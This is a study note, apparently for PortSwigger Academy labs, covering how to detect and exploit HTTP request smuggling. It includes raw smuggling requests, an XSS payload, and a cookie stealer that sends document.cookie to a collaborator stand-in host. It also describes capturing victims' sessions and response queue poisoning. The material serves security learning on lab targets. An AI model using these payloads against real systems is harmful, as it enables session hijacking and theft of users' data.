## Approach

1. Scan using ***Burp Scanner*** or [manually](#Timing%20techniques), do it on `GET /`

> **Do not** make a request during scanning for **HTTP request smuggling**!
## Methodology
### Timing Techniques

> [!warning]
> Prerequisites
> - [ ] Set protocol [HTTP/1.1 / HTTP/2]
> - [ ] ***Repeater*** -> Settings -> Turn off **Update Content-Length**
>      > Can be turned on for CL.[X] exploits
> - [ ] (Optional) **Show non-printable chars**

> [!NOTE]
> Terms
> - FE -> Front End
> - BE -> Back End
> - TE -> Transfer-Encoding
> - CL -> Content- Length
> - H2 -> `HTTP/2`
> - 0 -> Content-Length: 0

> In TE, there is null termination for telling the server the end of a request body
```
// Null termination TE
0\r\n
\r\n
```
#### HTTP/1.1

> [!warning] 
> Confirm if `HTTP/1.1` **HTTP request smuggling** is possible, how?
> - If both TE and CL can be used at the same time, possible vuln 
> - If not, your response is `400` with error "Both chunked encoding and content-length were specified", this means it's HTTP/2

![](attachments/Pasted%20image%2020260103091929.png)
##### Detecting FE

> **Trailing CRLF** after **X**
```
POST / HTTP/1.1
Host: [HOST]
...
Transfer-Encoding: chunked
Content-Length: 0

3
abc
X
```

> If 400 "Invalid request"
> FE -> TE
> Because no null termination for TE chunked, FE responds with 400
> To find BE check [this](#Detecting%20BE)

![](attachments/Pasted%20image%2020260103115747.png)

> If timeout
> FE -> CL
> BE -> TE

![](attachments/Pasted%20image%2020260103162208.png)
##### Detecting BE

> **No trailing CRLF** after **X**
```
POST / HTTP/1.1
Host: [HOST]
...
Transfer-Encoding: chunked
Content-Length: 0

0

X
```

> If timeout
> BE -> CL

![](attachments/Pasted%20image%2020260103154954.png)
##### Tips

> You can use ***Burp Inspector*** to determine chunk size in hexadecimal
![](attachments/Pasted%20image%2020260103160551.png)

> Turn on **Update Content-Length** when exploiting CL.[X] vulns, so you don't have to update CL every time you send a different request
![](attachments/Pasted%20image%2020260103160943.png)
### Differentiate response
#### HTTP/2

> [!warning] Prerequisite
> Confirm it's using probably H2, look at [HTTP/1.1](#HTTP/1.1)

> Variations of it depends on what injection is possible:
- [CRLF injection](#[6.%20HTTP/2%20request%20smuggling%20via%20CRLF%20injection](https%20//portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection))
- [Normal H2.TE](#[7.%20Response%20queue%20poisoning%20via%20H2.TE%20request%20smuggling](https%20//portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling))

![](attachments/Pasted%20image%2020260103192620.png)
> 404 triggered from H2.TE via CRLF injection TE

## Labs
### [1. HTTP request smuggling, obfuscating the TE header](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header)

> [!NOTE]
> - BE can be fooled with a second false TE header `Transfer-Encoding: xchunked` reverting it to using `Content-Length` 
> - while FE only reads the first TE `Transfer-Encoding: chunked` resulting in a discrepancy, allowing smuggling **TE.CL**

```
POST / HTTP/1.1
Host: 0a24007a04fa43ad824f4da30031008f.web-security-academy.net
...
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Content-Length: 4

25
GPOST / HTTP/1.1
Content-Length: 6

0
```

> - FE reads full body request including smuggling request
> - BE reads until `25\r\n` due to `Content-Length: 4`, the rest gets appended to the next HTTP request
![](attachments/Pasted%20image%2020260103122505.png)
### [2. Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)

> [!NOTE] 
> `/admin` panel bypass via smuggling request where host is **localhost**

> - FE reads full body request including smuggling request
> - BE reads until `3a\r\n` due to `Content-Length: 4`, the rest gets appended to the next HTTP request
![](attachments/Pasted%20image%2020260103160036.png)
### [3. Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te)

> [!NOTE] 
> `/admin` panel bypass via smuggling request where host is **localhost**

> - FE reads full body request including smuggling request based on `Content-Length` header
> - BE reads until `0\r\n\r\n` which is the null terminator, the rest gets appended to the next HTTP request
![](attachments/Pasted%20image%2020260103162510.png)
### [4. Exploiting HTTP request smuggling to capture other users' requests](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)
> [!NOTE] 
> Stealing session via request smuggling, using **comment section** as smuggling request to store request data

> Comment section used as smuggling request to capture the next user's HTTP request, the amount of data captured is controlled by the smuggle request's `Content-Length`, this case it's **923** bytes
![](attachments/Pasted%20image%2020260103164834.png)

> Victim user's request, `User-Agent` has **(Victim)**
![](attachments/Pasted%20image%2020260103164856.png)
### [5. Exploiting HTTP request smuggling to deliver reflected XSS](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)

> [!NOTE] 
> Deliver XSS to victim via smuggling request, `User-Agent` header is reflected in page allowing XSS through that

***alert(1)* payload**

```
POST / HTTP/1.1
Host: [LAB_URL]
Cookie: session=[SESSION]
...
Transfer-Encoding: chunked
Content-Length: [CL]

0

GET /post?postId=6 HTTP/1.1
Host: [LAB_URL]
User-Agent: "><script>alert(1)</script>
Foo: x
```

**Cookie stealer**

```
POST / HTTP/1.1
Host: [LAB_URL]
Cookie: session=[SESSION]
...
Transfer-Encoding: chunked
Content-Length: [CL]

0

GET /post?postId=6 HTTP/1.1
Host: [LAB_URL]
User-Agent: "><script>fetch(`//[BURP_COLLABORATOR]?c=${btoa(document.cookie)}`)</script>
Foo: x
```

![](attachments/Pasted%20image%2020260103181926.png)
### [6. HTTP/2 request smuggling via CRLF injection](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection)

> [!NOTE] 
> - **H2.TE** HTTP request smuggling vuln via **TE CRLF injection**
> - Capture victim session via stored request data in **recent searches** functionality

> Smuggling request using search bar request that stores recent searches to session allowing request capture containing victim session
![](attachments/Pasted%20image%2020260103193642.png)

![](attachments/Pasted%20image%2020260103193925.png)
### [7. Response queue poisoning via H2.TE request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)

> [!NOTE] 
> - H2.TE vuln
> - Do **response queue poisoning** to get login response of victim user containing **session**

> - Both request is 404, Second request is a complete request allowing two request to be accepted by the server
> - Next request (2nd request) by user will get the second request `GET /asd` response a 404
> - The next request again (3rd request) after will get the (2nd request) response
> - So after poisoning, when a user request, they will get the response of the user who just made a request before him
![](attachments/Pasted%20image%2020260103195707.png)

> - Use ***Burp Intruder*** to automate poisoning
> - Use **null payload**
> - Use a **resource pool** with **Request delay 3000(ms)** and **Concurrent request 1**
![](attachments/Pasted%20image%2020260103200316.png)


